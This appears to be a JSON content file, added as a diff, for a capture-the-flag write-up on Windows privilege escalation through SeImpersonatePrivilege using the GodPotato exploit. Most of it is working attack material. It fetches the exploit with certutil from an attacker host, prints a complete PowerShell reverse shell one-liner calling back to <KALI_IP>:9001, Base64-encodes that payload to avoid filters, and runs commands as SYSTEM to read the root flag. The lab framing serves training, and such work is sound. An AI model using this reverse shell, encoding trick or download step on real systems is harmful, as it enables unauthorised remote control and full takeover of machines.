@@ -1,0 +1,121 @@
+[
+  {
+    "type": "section_heading",
+    "id": "priv-esc-intro",
+    "text": "Phase 3: Privilege Escalation (GodPotato)"
+  },
+  {
+    "type": "order_block",
+    "id": "seimpersonate-logic",
+    "text": "The discovery of <highlight>SeImpersonatePrivilege</highlight> is a critical finding. This privilege allows a process to impersonate a client after authentication. By using an exploit from the 'Potato' family, we can trick a SYSTEM-level service into authenticating with us, capturing its token, and spawning a shell as <highlight>NT AUTHORITY\\SYSTEM</highlight>."
+  },
+  {
+    "type": "section_heading",
+    "id": "exploit-transfer",
+    "text": "Step 1: Transferring the Exploit to Target"
+  },
+  {
+    "type": "order_block",
+    "id": "transfer-logic",
+    "text": "We move the <highlight>GodPotato-Net4.exe</highlight> binary from our Kali machine to the Windows target using <highlight>certutil.exe</highlight>."
+  },
+  {
+    "type": "code_block",
+    "id": "kali-server",
+    "language": "bash",
+    "code": "# On Kali (Start a web server)\npython3 -m http.server 80"
+  },
+  {
+    "type": "code_block",
+    "id": "target-download",
+    "language": "powershell",
+    "code": "# On Windows Shell\ncertutil -urlcache -f http://<KALI_IP>/GodPotato-Net4.exe gp.exe"
+  },
+  {
+    "type": "section_heading",
+    "id": "execution-escalation",
+    "text": "Step 2: Executing GodPotato for SYSTEM Shell"
+  },
+  {
+    "type": "order_block",
+    "id": "godpotato-exec-logic",
+    "text": "First, we verify the exploit works by running a simple <highlight>whoami</highlight>. If successful, it confirms we can impersonate the SYSTEM token."
+  },
+  {
+    "type": "code_block",
+    "id": "gp-run-command",
+    "language": "powershell",
+    "code": ".\\gp.exe -cmd \"whoami\""
+  },
+  {
+    "type": "output_block",
+    "id": "gp-output",
+    "language": "text",
+    "code": "[*] Starting the DCOM server...\n[*] Triggering the authentication...\n[*] Impersonating the SYSTEM token...\nnt authority\\system"
+  },
+  {
+    "type": "section_heading",
+    "id": "system-reverse-shell",
+    "text": "Step 2.1: The Raw Reverse Shell Payload"
+  },
+  {
+    "type": "order_block",
+    "id": "system-shell-logic",
+    "text": "We use GodPotato to execute a PowerShell reverse shell one-liner. However, directly passing complex symbols like <highlight>$</highlight>, <highlight>\"</highlight>, and <highlight>()</highlight> inside the <highlight>-cmd</highlight> flag often causes the command to break or get blocked by security filters."
+  },
+  {
+    "type": "code_block",
+    "id": "gp-rev-shell-raw",
+    "language": "powershell",
+    "code": "# Raw PowerShell One-Liner\n$c=New-Object Net.Sockets.TCPClient('<KALI_IP>',9001);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=([Text.Encoding]::ASCII).GetBytes($sb);$s.Write($sb2,0,$sb2.Length);$s.Flush()};$c.Close()"
+  },
+  {
+    "type": "section_heading",
+    "id": "base64-encoding-logic",
+    "text": "Step 2.2: Encoding for Stability (Base64)"
+  },
+  {
+    "type": "order_block",
+    "id": "base64-logic",
+    "text": "To ensure the shell executes correctly and bypasses simple syntax errors, we must convert the raw payload into <highlight>Base64 (UTF-16LE)</highlight>. This allows us to use the <highlight>-EncodedCommand</highlight> flag, making the execution much more stable under GodPotato."
+  },
+  {
+    "type": "code_block",
+    "id": "kali-encoding",
+    "language": "bash",
+    "code": "# On Kali: Convert the raw shell to Base64\necho -n '$c=New-Object Net.Sockets.TCPClient(\"<KALI_IP>\",9001);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=([Text.Encoding]::ASCII).GetBytes($sb);$s.Write($sb2,0,$sb2.Length);$s.Flush()};$c.Close()' | iconv -t utf-16le | base64 -w 0"
+  },
+  {
+    "type": "code_block",
+    "id": "gp-encoded-exec",
+    "language": "powershell",
+    "code": "# Execute the Encoded Payload via GodPotato\n.\\gp.exe -cmd \"powershell -EncodedCommand <BASE64_STRING>\""
+  },
+  {
+    "type": "section_heading",
+    "id": "final-flag-capture",
+    "text": "Step 3: Systematic Root Flag Capture"
+  },
+  {
+    "type": "order_block",
+    "id": "root-flag-logic",
+    "text": "With SYSTEM privileges, we perform a final enumeration to list all users, identify their directories, and locate the root flag filename before reading its content."
+  },
+  {
+    "type": "code_block",
+    "id": "read-flag",
+    "language": "powershell",
+    "code": "# 1. List all system users to confirm targets\n.\\gp.exe -cmd \"cmd.exe /c net user\"\n\n# 2. List the Users directory to check folder structure\n.\\gp.exe -cmd \"cmd.exe /c dir C:\\Users\"\n\n# 3. List the Administrator's Desktop to find the root flag name\n.\\gp.exe -cmd \"cmd.exe /c dir C:\\Users\\Administrator\\Desktop\"\n\n# 4. Final Capture: Read the root flag content\n.\\gp.exe -cmd \"cmd.exe /c type C:\\Users\\Administrator\\Desktop\\root.txt\""
+  },
+  {
+    "type": "explanation",
+    "id": "potato-summary",
+    "title": "Potato Attack Mechanism Summary",
+    "items": [
+      "Vulnerability: SeImpersonatePrivilege (Standard on many service accounts)",
+      "Exploit: GodPotato triggers a DCOM/RPC call to force SYSTEM authentication",
+      "Stability: Base64 encoding prevents syntax breaking within the -cmd argument",
+      "Outcome: Full Administrative control (NT AUTHORITY\\SYSTEM) over the machine"
+    ]
+  }
+]
